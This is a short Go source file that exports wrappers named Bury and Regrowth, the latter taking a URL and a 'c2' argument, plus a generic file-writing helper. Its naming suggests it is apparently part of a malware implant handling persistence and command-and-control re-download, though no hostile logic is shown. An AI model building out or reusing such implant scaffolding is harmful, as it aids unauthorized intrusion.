package roots

import (
	"bufio"
	"os"
	"sync"
)

func Bury() {
	bury()
}

func Regrowth(url string, c2 string, wg *sync.WaitGroup) {
	regrowth(url, c2, wg)
}

func CreateFileAndWriteData(fileName string, writeData []byte) error {
	fileHandle, err := os.Create(fileName)
	if err != nil {
		return err
	}
	writer := bufio.NewWriter(fileHandle)
	defer fileHandle.Close()
	writer.Write(writeData)
	writer.Flush()
	return nil
}
